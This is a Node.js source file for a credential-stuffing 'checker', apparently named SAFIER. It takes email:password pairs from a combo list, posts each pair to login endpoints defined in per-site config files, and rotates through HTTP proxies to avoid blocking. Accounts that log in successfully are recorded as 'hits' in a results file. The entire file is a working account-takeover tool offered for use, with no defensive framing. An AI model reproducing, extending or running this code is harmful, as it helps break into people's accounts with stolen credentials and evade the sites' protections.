//Dependencies
const Request = require("request")
const Delay = require("delay")
const Chalk = require("chalk")
const Fs = require("fs")

//Variables
const HTTP_Proxies = Fs.readFileSync("./requirements/proxies.txt", "utf8").split("\n")
const Accounts = Fs.readFileSync("./requirements/combo.txt", "utf8").split("\n")

var Checker_Data = {}
Checker_Data.hits = 0
Checker_Data.invalids = 0
Checker_Data.whitelisted_accounts = []
Checker_Data.ltc = Accounts.length
Checker_Data.isdone = false
Checker_Data.candone = 0

//Functions
function Add_Hits(account, back_name){
    var Hits = Fs.readFileSync("./results/hits.txt", "utf8")

    if(Hits.length == 0){
        Fs.writeFileSync("./results/hits.txt", `[${back_name}] ${account}`, "utf8")
    }else{
        Fs.writeFileSync("./results/hits.txt", `${Hits}\n[${back_name}] ${account}`, "utf8")
    }
}

function Initiate_A_Checker(account_index, proxy_index, config){
    if(Checker_Data.isdone){
        return
    }

    if(typeof(config.body) == "object"){
        Main()
        async function Main(){
            await Delay(1000)

            if(account_index > Accounts.length){
                return
            }

            if(Checker_Data.candone == Checker_Data.ltc){
                Checker_Data.isdone = true
                return
            }

            if(proxy_index > HTTP_Proxies.length){
                proxy_index = 0
                Main()
                return
            }

            var request_body = JSON.stringify(config.body)
            request_body = request_body.replace("<email>", Accounts[account_index].split(":")[0])
            request_body = request_body.replace("<password>", Accounts[account_index].split(":")[1].replace("\r", ""))

            if(Checker_Data.whitelisted_accounts.indexOf(Accounts[account_index]) != -1){
                account_index += 1
                Main()
                return
            }


            Request.post(config.api_link, {
                headers: config.headers,
                body: request_body,
                proxy: `http://${HTTP_Proxies[proxy_index]}`
            }, function(err, res, body){
                if(err){
                    proxy_index += 1
                    Main()
                    return
                }

                var is_valid = false
                var do_retry = false

                if(body.indexOf(config.checking.invalid_if_contain) != -1){
                    is_valid = false
                }

                if(body.indexOf(config.checking.retry_if_contain) != -1){
                    do_retry = true
                }

                if(body.indexOf(config.checking.valid_if_contain) != -1){
                    is_valid = true
                }

                if(do_retry){
                    proxy_index += 1
                    Main()
                    return
                }

                if(is_valid){
                    Add_Hits(Accounts[account_index], config.config.back_name)
                    Checker_Data.hits += 1
                    Checker_Data.whitelisted_accounts.push(`[${config.config.back_name}] ${Accounts[account_index]}`)
                    return
                }else{
                    Checker_Data.invalids += 1
                    Checker_Data.whitelisted_accounts.push(`[${config.config.back_name}] ${Accounts[account_index]}`)
                    return
                }
            })
        }
    }else if(typeof(config.body) == "string"){
        Main()
        async function Main(){
            await Delay(1000)

            if(account_index > Accounts.length){
                return
            }

            if(Checker_Data.candone == Checker_Data.ltc){
                Checker_Data.isdone = true
                return
            }

            if(proxy_index > HTTP_Proxies.length){
                proxy_index = 0
                Main()
                return
            }

            var request_body = config.body
            request_body = request_body.replace("<email>", Accounts[account_index].split(":")[0])
            request_body = request_body.replace("<password>", Accounts[account_index].split(":")[1].replace("\r", ""))

            if(Checker_Data.whitelisted_accounts.indexOf(Accounts[account_index]) != -1){
                account_index += 1
                Main()
                return
            }


            Request.post(config.api_link, {
                headers: config.headers,
                body: request_body,
                proxy: `http://${HTTP_Proxies[proxy_index]}`
            }, function(err, res, body){
                if(err){
                    proxy_index += 1
                    Main()
                    return
                }

                var is_valid = false
                var do_retry = false

                if(body.indexOf(config.checking.invalid_if_contain) != -1){
                    is_valid = false
                }

                if(body.indexOf(config.checking.retry_if_contain) != -1){
                    do_retry = true
                }

                if(body.indexOf(config.checking.valid_if_contain) != -1){
                    is_valid = true
                }

                if(do_retry){
                    proxy_index += 1
                    Main()
                    return
                }

                if(is_valid){
                    Add_Hits(Accounts[account_index], config.config.back_name)
                    Checker_Data.hits += 1
                    Checker_Data.whitelisted_accounts.push(`[${config.config.back_name}] ${Accounts[account_index]}`)
                    return
                }else{
                    Checker_Data.invalids += 1
                    Checker_Data.whitelisted_accounts.push(`[${config.config.back_name}] ${Accounts[account_index]}`)
                    return
                }
            })
        }
    }
}

function Initiater(ais, pis){
    Fs.readdir("./configs", "utf8", function(err, configs){
        if(err){}

        configs.forEach(config =>{
            Initiate_A_Checker(ais, pis, require(`./configs/${config}`))
        })
    })
}

//Main
var doesnotcount = true

Fs.readdir("./configs", "utf8", function(err, configs){
    if(err){}

    configs.forEach(config =>{
        if(doesnotcount == false){
            Checker_Data.ltc += Accounts.length
        }

        doesnotcount = false
    })
})

setTimeout(function(){
    for( i = 0; i <= Accounts.length-1; i++ ){
        Initiater(i, i+1)
    }
}, 5000)

setInterval(function(){
    console.clear()
    console.log(Chalk.yellowBright(`==================================================
    ███████  █████  ███████ ██ ███████ ██████  
    ██      ██   ██ ██      ██ ██      ██   ██ 
    ███████ ███████ █████   ██ █████   ██████  
         ██ ██   ██ ██      ██ ██      ██   ██ 
    ███████ ██   ██ ██      ██ ███████ ██   ██
==================================================`))

    console.log(Chalk.greenBright(`Hits: ${Checker_Data.hits}`))
    console.log(Chalk.redBright(`Invalids: ${Checker_Data.invalids}`))

    if(Checker_Data.isdone){
        console.log(Chalk.green("Done checking."))
        process.exit()
    }
}, 1000)

process.on("uncaughtException", function(){
    return
})